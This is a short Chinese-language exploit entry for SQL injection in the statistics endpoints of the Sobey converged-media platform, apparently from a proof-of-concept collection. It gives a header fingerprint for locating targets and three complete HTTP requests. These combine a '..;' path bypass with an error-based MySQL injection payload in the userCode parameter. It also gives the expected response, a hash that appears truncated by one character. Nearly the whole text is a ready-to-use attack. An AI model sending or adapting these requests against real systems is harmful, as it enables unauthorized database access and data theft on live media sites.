# 索贝融媒体statistics存在多个SQL注入漏洞

- **系统**：索贝融媒体　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`header="Sobey"`
- **请求**：`GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1`
- **关键头**：`Host: target.com`

**请求体 / payload**
```
GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztTWArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1
Host: target.com
GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztMonthsDetailArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1'+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+'1'='1 HTTP/1.1
Host: target.com
```
- **预期**：200　|　c4ca4238a0b923820dcc509a6f75849